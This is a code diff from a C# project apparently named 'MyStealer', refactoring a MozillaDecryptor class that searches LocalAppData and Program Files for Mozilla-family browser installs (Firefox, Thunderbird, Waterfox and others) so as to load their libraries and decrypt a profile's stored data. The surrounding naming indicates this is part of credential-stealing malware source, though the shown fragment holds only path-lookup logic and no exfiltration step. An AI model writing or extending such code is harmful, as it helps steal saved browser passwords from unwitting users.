@@ -32,36 +32,20 @@ namespace MyStealer.Decryptor
         private PrErrorToName PR_ErrorToName;
         private PrErrorToString PR_ErrorToString;
 
-        private static IList<string> knownPaths;
-
-        static MozillaDecryptor()
+        public MozillaDecryptor(string[] libDirectory, string configDirectory)
         {
-            var knownNames = new string[] {
-                "Mozilla Firefox",
-                "Firefox Developer Edition",
-                "Mozilla Thunderbird",
-                "Nightly",
-                "SeaMonkey",
-                "Waterfox"
-            };
-
             var knownBasePaths = new string[] {
                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                 Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                 Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)
             };
 
-            knownPaths = new List<string>();
+            var knownPaths = new List<string>();
             foreach (var basePath in knownBasePaths)
             {
-                foreach (var name in knownNames)
+                foreach (var name in libDirectory)
                     knownPaths.Add(Path.Combine(basePath, name));
             }
-        }
-
-        public MozillaDecryptor(string configDirectory)
-        {
-            var mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
 
             var loadPath = "";
             foreach (var knownPath in knownPaths)
